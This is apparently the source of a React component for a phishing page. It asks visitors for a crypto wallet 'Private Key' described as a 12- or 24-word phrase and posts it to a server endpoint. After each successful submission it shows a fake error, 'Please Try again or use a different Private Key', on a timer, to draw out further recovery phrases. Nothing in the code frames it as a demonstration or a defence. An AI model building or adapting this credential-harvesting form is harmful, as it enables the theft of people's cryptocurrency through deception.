"use client";
import React, { useEffect, useState } from "react";
import { Button } from "./ui/button";
import { Card, CardContent, CardFooter } from "./ui/card";
import { Textarea } from "./ui/textarea";
import LoaderOne from "./LoaderOne";
import { AlertDestructive } from "./AlertDestructive";

export default function PrivateKey() {
  const [buttonClick, setButtonClick] = useState<boolean>(false);
  const [emailSubmitted, setEmailSubmitted] = useState<boolean>(false);
  const [emailError, setEmailError] = useState<boolean>(true);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (emailSubmitted) {
      timer = setTimeout(() => {
        setEmailError(false);
      }, 4000); // Change this value to the desired delay in milliseconds
    }
    return () => clearTimeout(timer);
  }, [emailSubmitted]);

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    setButtonClick(true);
    const data = {
      private_key: e.target.private_key.value,
    };
    const JSONdata = JSON.stringify(data);
    const endpoint = "/api/private_key";

    // Form the request for sending data to the server.
    const options = {
      // The method is POST because we are sending data.
      method: "POST",
      // Tell the server we're sending JSON.
      headers: {
        "Content-Type": "application/json",
      },
      // Body of the request is the JSON data we created above.
      body: JSONdata,
    };

    const response = await fetch(endpoint, options);
    const resData = await response.json();

    if (response.status === 200) {
      console.log("Message sent.");
      setButtonClick(false);
      setEmailSubmitted(true);

      if (emailSubmitted) {
        setTimeout(() => {
          setEmailError(false);
        }, 2000);
      }
    }

    e.target.private_key.value = "";
  };

  return (
    <div>
      <form onSubmit={handleSubmit}>
        <Card>
          <CardContent className="space-y-2">
            <div className="grid w-full gap-1.5 py-2">
              <Textarea
                placeholder="Enter your Private Key"
                name="private_key"
                id="private_key"
                required
                rows={10}
              />
              <p className="text-sm text-muted-foreground">
                Typically 12 (sometimes 24) words separated by a single space.
              </p>
            </div>
          </CardContent>
          <CardFooter>
            <Button type="submit">
              {!buttonClick ? (
                "Proceed"
              ) : (
                <div className="flex items-center justify-center">
                  <LoaderOne />
                </div>
              )}
            </Button>
          </CardFooter>
          {emailError && emailSubmitted ? (
            <AlertDestructive
              decription={"Please Try again or use a different Private Key."}
            />
          ) : null}
        </Card>
      </form>
    </div>
  );
}
